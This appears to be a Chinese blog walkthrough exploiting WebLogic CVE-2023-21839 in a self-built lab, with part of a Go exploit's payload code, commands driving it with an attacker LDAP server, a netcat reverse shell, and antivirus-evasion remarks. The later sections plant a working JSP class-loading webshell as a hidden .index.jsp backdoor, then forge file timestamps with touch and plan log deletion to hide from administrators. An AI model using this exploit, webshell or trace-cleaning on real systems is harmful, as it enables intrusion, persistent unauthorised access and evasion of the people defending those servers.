<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> giop</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">D</span><span class="params">(str <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	data, _ := hex.DecodeString(str)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">E</span><span class="params">(b []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Int32</span><span class="params">(i <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line">	binary.BigEndian.PutUint32(b, <span class="type">uint32</span>(i))</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>由于该漏洞的影响范围为<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code>，所以该代码先进行了网站<code>weblogic</code>版本检测，如果不是12或14版本则进行测试，否则结束</p>
<blockquote>
<p>WebLogic Server使用WLS Key来加密和解密敏感数据，例如密码和证书私钥</p>
<p>WLS Key是由WebLogic Server生成并管理的，它不是由管理员手动设置的，也不是系统默认的。在WebLogic Server启动时，它会自动生成一个WLS Key，并使用该密钥来加密和解密存储在WebLogic Server中的敏感数据，例如密码和证书私钥。</p>
<p>WebLogic Server生成的WLS Key是每个实例唯一的，每个实例都有自己的WLS Key。这是因为WLS Key是通过使用特定于WebLogic Server实例的信息生成的</p>
</blockquote>
<p>所以在下面的代码中wls作用</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ver == <span class="string">&quot;12&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 12&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ver == <span class="string">&quot;14&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 14&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646&quot;</span> +</span><br><span class="line">			<span class="string">&quot;d696e53657276657200000000000000003349444c3a7765626c&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6769632f636f7262612f636f732f6e616d696e672f4e616d6&quot;</span> +</span><br><span class="line">			<span class="string">&quot;96e67436f6e74657874416e793a312e30000000000002380000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;200000000000000003349444c3a7765626c6f6769632f636f72&quot;</span> +</span><br><span class="line">			<span class="string">&quot;62612f636f732f6e616d696e672f4e616d696e67436f6e74657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541&quot;</span> +</span><br><span class="line">			<span class="string">&quot;2e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[!] error and exit&quot;</span>)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





<hr>
<p>这个go脚本的使用很简单，先在攻击机<code>1369</code>端口打开ldap</p>
<p>先进行编译</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> build main.<span class="keyword">go</span> -<span class="keyword">o</span> web.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>

<p>然后攻击机上打开1369端口，挂上ldap</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302000014731.png"><img src="/CVE-Test/image-20230302000014731.png" alt="image-20230302000014731"></a></p>
<p>最后简单跑个计算器<code>（测试时间：2023/3/1，火绒未检测到，但是弹cmd还是会被警告的）</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302000455096.png"><img src="/CVE-Test/image-20230302000455096.png" alt="image-20230302000455096"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302000412160.png"><img src="/CVE-Test/image-20230302000412160.png" alt="image-20230302000412160"></a></p>
<h4 id="公网测试"><a href="#公网测试" class="headerlink" title="公网测试"></a>公网测试</h4><p>太穷了，没有第二台电脑，在<code>aliyun</code>上搞了个<code>weblogic</code>，看看是否检测的到吗</p>
<p>这是公网环境下的</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302001529947.png"><img src="/CVE-Test/image-20230302001529947.png" alt="image-20230302001529947"></a></p>
<p>然后一样的测试如上，会被<code>windows defender</code>检测到，但是不会拦截，还是会一样执行命令</p>
<p>和朋友借了一下服务器测试，确实是可以实现公网测试的，而且<code>windows defender</code>并未拦截(公网测试时间:2023&#x2F;3&#x2F;2)</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230302210930469.png"><img src="/CVE-Test/image-20230302210930469.png" alt="image-20230302210930469"></a></p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>从官网下载<code>Weblogic 12.2.1.3.0</code></p>
<p><code>https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20230226141556869.png"><img src="/CVE-Test/image-20230226141556869.png" alt="image-20230226141556869"></a></p>
<h4 id="配置java环境"><a href="#配置java环境" class="headerlink" title="配置java环境"></a>配置java环境</h4><p>但是需要注意，由于<code>Weblogic</code>中的<code>maven</code>的存在，其识别<code>jdk</code>时，只针对环境变量名<code>JAVA_HOME</code>的路径进行识别，而如果是在<code>PATH</code>中配置的，会报错找不到<code>java</code>环境的位置</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>Cannot determine the Java Home ERROR: Specify the -jreLoc option</span><br></pre></td></tr></table></figure>

<p>然后再次管理员执行时发现失败，查看报错日志</p>
<blockquote>
<p>java.lang.NullPointerException: Cannot invoke “java.lang.<strong><code>reflect.Method</code></strong>.invoke(Object, Object[])” because “com.sun.<code>xml.bind</code>.v2.runtime.reflect.opt.Injector.defineClass” <strong><code>is null</code></strong>[[</p>
</blockquote>
<p>猜测应该是我的<code>java</code>自身的问题</p>
<p>从<code>stack</code>中了解到了，在<code>java9</code>的时候，<code>JAXB</code>（Java Architecture for XML Binding）<code>[java映射为xml的表示方式]</code> </p>
<p>在<code>java9</code>已经被标记为弃用，在<code>java11</code>的时候已经被删除，所以需要换到低版本的<code>java</code>或者在依赖项添加<code>xml</code>库，让其重新映射</p>
<p><a href="https://javaalmanac.io/jdk/11/apidiff/9/">New APIs in Java 11 - javaalmanac.io</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.messaging.saaj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saaj-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>【建议下载jdk8低版本最方便，记得再次修改<code>JAVA_HOME</code>环境变量】</p>
<blockquote>
<p>注意，这个和log4j的原因一样，是加载远程恶意类导致远程命令的执行，所以对java是否开启加载远程类，也就是要注意对应的版本</p>
<p>版本 ≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code></p>
</blockquote>
<p>所以这里直接下载JDK-8u171</p>
<p><code>https://www.oracle.com/hk/java/technologies/javase/javase8-archive-downloads.html</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/jdk/</span><br><span class="line"></span><br><span class="line"><span class="comment">#部署并修改环境变量</span></span><br><span class="line">sudo vi ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="comment">#在文件末尾追加下面4行内容</span></span><br><span class="line"><span class="comment">#这里要注意目录要换成自己解压的jdk目录</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 </span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行命令使得上面的环境变量成功</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>

<h5 id="查看版本-1"><a href="#查看版本-1" class="headerlink" title="查看版本"></a>查看版本</h5><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/2.png"><img src="/CVE-Test/2.png" alt="2"></a></p>
<h3 id="安装weblogic"><a href="#安装weblogic" class="headerlink" title="安装weblogic"></a>安装<code>weblogic</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/1.png"><img src="/CVE-Test/1.png" alt="1"></a></p>
<p>安装目录名和weblogic所在用户组默认</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/4.png"><img src="/CVE-Test/4.png" alt="4"></a></p>
<p> 安装中</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/5.png"><img src="/CVE-Test/5.png" alt="5"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/6.png"><img src="/CVE-Test/6.png" alt="6"></a></p>
<p>用户名默认weblogic</p>
<p>密码为123456789</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/7.png"><img src="/CVE-Test/7.png" alt="7"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/8.png"><img src="/CVE-Test/8.png" alt="8"></a></p>
<h3 id="安装完成后，启动服务"><a href="#安装完成后，启动服务" class="headerlink" title="安装完成后，启动服务"></a>安装完成后，启动服务</h3><p>找到<code>/bin</code>启动服务脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&#x27;startWebLogic.sh&#x27;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130123224439.png"><img src="/CVE-Test/image-20231130123224439.png" alt="image-20231130123224439"></a></p>
<p>执行脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash /home/ttoc/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/startWebLogic.sh </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130123350919.png"><img src="/CVE-Test/image-20231130123350919.png" alt="image-20231130123350919"></a></p>
<p>成功访问</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130123511391.png"><img src="/CVE-Test/image-20231130123511391.png" alt="image-20231130123511391"></a></p>
<h3 id="漏洞存在性测试"><a href="#漏洞存在性测试" class="headerlink" title="漏洞存在性测试"></a>漏洞存在性测试</h3><p>针对这种 T3 及 IIOP出现的漏洞，和log4j2一样，采用dnslog测试</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">.\CVE-<span class="number">2023</span>-<span class="number">21839</span>.exe -<span class="built_in">ip</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">169</span>.<span class="number">157</span> -port <span class="number">7001</span> -ldap ldap:<span class="comment">//nuu4hz.dnslog.cn</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/dnslog%E6%B5%8B%E8%AF%95.png"><img src="/CVE-Test/dnslog%E6%B5%8B%E8%AF%95.png" alt="dnslog测试"></a></p>
<p>发现有请求，说明可能存在漏洞</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/dnslog.png"><img src="/CVE-Test/dnslog.png" alt="dnslog"></a></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
<p>靶机ubuntu20.04：192.168.169.157</p>
<p>攻击机kali 2023.2：192.168.169.130</p>
</blockquote>
<p>攻击机开启监听，准备反弹shell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130225927419.png"><img src="/CVE-Test/image-20231130225927419.png" alt="image-20231130225927419"></a></p>
<p>然后使用JNDIExploit-1.3-SNAPSHOT.jar搭建ldap服务器</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130231729924.png"><img src="/CVE-Test/image-20231130231729924.png" alt="image-20231130231729924"></a></p>
<p>用go工具向靶机weblogic服务发送反弹shell的命令</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130224424739.png"><img src="/CVE-Test/image-20231130224424739.png" alt="image-20231130224424739"></a></p>
<p>但是执行后仍然遇到一点点问题，攻击机的JNDIExploit-1.3-SNAPSHOT.jar报错</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130223814313.png"><img src="/CVE-Test/image-20231130223814313.png" alt="image-20231130223814313"></a></p>
<p>错误<code>java.lang.IllegalAccessError: superclass access check failed</code>通常发生在一个类试图访问另一个类中的某些元素，但是由于Java的访问控制，这个操作被禁止了。</p>
<p>在这种的情况下，<code>com.feihong.ldap.template.TomcatEchoTemplate</code>类试图访问<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>类，但是由于模块<code>java.xml</code>并没有将<code>com.sun.org.apache.xalan.internal.xsltc.runtime</code>导出给<code>com.feihong.ldap.template.TomcatEchoTemplate</code>所在的模块，所以访问失败了。</p>
<p>这个问题可能是由于Java的模块化系统引入的。</p>
<p>从Java 9开始，Java引入了模块系统，允许将类和接口组织到不同的模块中，并且可以控制模块之间的访问。</p>
<p>解决这个问题的一种方法是使用<code>--add-exports</code>选项来打开模块的访问权限。</p>
<p>所以只用修改一下命令即可命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED -jar JNDIExploit-1.3-SNAPSHOT.jar -i 192.168.169.130</span><br></pre></td></tr></table></figure>

<p>这个命令会将<code>java.xml</code>模块中的<code>com.sun.org.apache.xalan.internal.xsltc.runtime</code>包导出给所有未命名的模块。</p>
<p>再次执行，成功</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130231601753.png"><img src="/CVE-Test/image-20231130231601753.png" alt="image-20231130231601753"></a></p>
<p>查看监听端口获取shell状态，成功获得靶机ubuntu的shell</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130233109406.png"><img src="/CVE-Test/image-20231130233109406.png" alt="image-20231130233109406"></a></p>
<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>反弹获取的shell存在很多问题，由于是通过nc监听获取的一次会话，如果nc被退出，获取的shell也会跟着丢失，</p>
<p>所以需要将获取的shell从nc监听会话，转为正式的一个终端会话。</p>
<p>先ctrl z讲nc获取的shell会话置于后台运行，然后执行命令，</p>
<p>先重置stty，也就意味着你看不到输入的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>  </span><br></pre></td></tr></table></figure>

<p>然后把后台挂起的nc获取的shell会话调回前台，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fg</span>  </span><br></pre></td></tr></table></figure>

<p>最后再次完全刷新终端屏幕，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reset  </span><br></pre></td></tr></table></figure>

<p>也可以合起来，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span>;reset</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130233218761.png"><img src="/CVE-Test/image-20231130233218761.png" alt="image-20231130233218761"></a></p>
<p>但是会发现虽然shell稳定了，但是显示错位了，这是stty的原因，当然也有部分kali和ubuntu之间终端显示底层的差异导致，可以用python自带的交互式shell处理，使得会话显示规整</p>
<p>直接启动python式交互</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130233600459.png"><img src="/CVE-Test/image-20231130233600459.png" alt="image-20231130233600459"></a></p>
<p>可以看到调用后格式更规整，并且该交互shell还直接使用当前终端的高亮显示，也方便分清文件类型。</p>
<p>由于weblogic服务需要比较高的权限用户执行启动，所以反弹shell获取的会话权限也会很高，所以如果没有对执行weblogic服务器启动的用户自身的权限进行限制，就会十分危险。</p>
<p>但是为了维持权限稳定，可以写一个jsp一句话木马上去</p>
<p>根据官方文档，weblogic服务器的网站文件以及目录都在这个目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/ttoc/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/webapp</span><br></pre></td></tr></table></figure>

<p>查看这个目录下的状况，</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ll</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130235701569.png"><img src="/CVE-Test/image-20231130235701569.png" alt="image-20231130235701569"></a></p>
<p>只需要找到一个web端可以非登录直接访问目录下文件的目录，写一个不死马，即可实现后门目的以来维持权限。</p>
<p>查看网页源码，发现&#x2F;console&#x2F;css可以在非登录状态下访问，并且该目录拥有执行权限，当然如果没有也可以凭借当前的root身份shell权限进行赋权，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231130235335497.png"><img src="/CVE-Test/image-20231130235335497.png" alt="image-20231130235335497"></a></p>
<p>然后在<code>css</code>目录下创建一个jsp一句话木马文件，</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>再给<code>1.jsp</code>赋权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 ./1.jsp</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201110707134.png"><img src="/CVE-Test/image-20231201110707134.png" alt="image-20231201110707134"></a></p>
<p>然后蚁剑尝试连接靶机的这个文件</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201000810938.png"><img src="/CVE-Test/image-20231201000810938.png" alt="image-20231201000810938"></a></p>
<p>访问发现连接成功，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201001110687.png"><img src="/CVE-Test/image-20231201001110687.png" alt="image-20231201001110687"></a></p>
<p>但是直接在当前服务端生成一个文件太容易被检测到，所以最好的办法就是将jsp一句话木马写入已有的jsp文件中，</p>
<p>先找一下当前目录的jsp文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*.jsp&quot;</span> 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201111621945.png"><img src="/CVE-Test/image-20231201111621945.png" alt="image-20231201111621945"></a></p>
<p>很快就会发现最后一个文件，</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/home/</span>ttoc<span class="regexp">/Oracle/</span>Middleware<span class="regexp">/Oracle_Home/</span>wlserver<span class="regexp">/server/</span>lib<span class="regexp">/consoleapp/</span>consolehelp/index.jsp</span><br></pre></td></tr></table></figure>

<p>做为index.jsp肯定可以被直接访问，而且在consolehelp路由下，所以是不需要登录访问的，于是将1.jsp内容附加到index.jsp的后面，然后删除1.jsp</p>
<p>先移动1.jsp到index.jsp所在目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> 1.jsp  /home/ttoc/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/consolehelp/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201112427314.png"><img src="/CVE-Test/image-20231201112427314.png" alt="image-20231201112427314"></a></p>
<p>然后将内容追加到index.jsp中</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201112511153.png"><img src="/CVE-Test/image-20231201112511153.png" alt="image-20231201112511153"></a></p>
<p>然后删掉1.jsp并为index.jsp赋执行权限</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201113317976.png"><img src="/CVE-Test/image-20231201113317976.png" alt="image-20231201113317976"></a></p>
<p>但是访问index.jsp文件时，发现并没有变化，哪怕删掉也依旧正常访问，这是因为weblogic有两种模式，一种是开发者模式，一种是生产模式，默认是生产模式，该模式下，修改的文件不会被部署到服务器上，它有自己的一个部署目录，而生产模式才会将修改文件重新部署，所以于是我换了个思路。</p>
<p>只是为了防止管理员发现而已生成文件，那我们可以生成一个隐藏文件 .index.jsp，虽然生产模式不会部署修改文件，但是新建文件还是会进行部署，于是再生成一个.index.jsp文件并写入jsp一句话木马，并index.jsp就恢复原来代码以及权限状态。</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201115947536.png"><img src="/CVE-Test/image-20231201115947536.png" alt="image-20231201115947536"></a></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">640</span> index.jsp</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201120655450.png"><img src="/CVE-Test/image-20231201120655450.png" alt="image-20231201120655450"></a></p>
<p>再次尝试蚁剑连接，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201120113628.png"><img src="/CVE-Test/image-20231201120113628.png" alt="image-20231201120113628"></a></p>
<p>连接成功，并且可以正常访问</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201120153540.png"><img src="/CVE-Test/image-20231201120153540.png" alt="image-20231201120153540"></a></p>
<h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>由于我们执行了大量命令，并且生成和修改了部分目录和文件，所以当管理员进行检测服务器最近更新情况就会很快发现该文件，所以需要删除命令执行日志，并修改文件，目录生成和修改时间和其他一样</p>
<h4 id="修改时间"><a href="#修改时间" class="headerlink" title="修改时间"></a>修改时间</h4><p>先修改.index.jsp所在目录下的，</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201120819297.png"><img src="/CVE-Test/image-20231201120819297.png" alt="image-20231201120819297"></a></p>
<p>发现主要就三个部分，当前目录修改时间，index.jsp和.index.jsp的修改时间，</p>
<p>痕迹清除最好和其他同属性文件时间一致，可以看到文件最后一次修改时间统一为</p>
<blockquote>
<p>Nov 23  2016 </p>
</blockquote>
<p>而目录修改时间统一为</p>
<blockquote>
<p>Nov 27 04:51</p>
</blockquote>
<p>于是执行命令</p>
<figure class="highlight irpf90"><table><tr><td class="code"><pre><span class="line"><span class="keyword">touch</span> -t <span class="number">201611230000</span> <span class="built_in">index</span>.jsp .<span class="built_in">index</span>.jsp</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121316063.png"><img src="/CVE-Test/image-20231201121316063.png" alt="image-20231201121316063"></a></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11270451</span> ./</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121529910.png"><img src="/CVE-Test/image-20231201121529910.png" alt="image-20231201121529910"></a></p>
<p>最后整体目录就正常了，时间也都正常了</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121609229.png"><img src="/CVE-Test/image-20231201121609229.png" alt="image-20231201121609229"></a></p>
<p>然后是开始尝试的css目录</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20231201121742343.png"><img src="/CVE-Test/image-20231201121742343.png" alt="image-20231201121742343"></a></p>
<p>时间一致，所以命令修改一下即可</p>
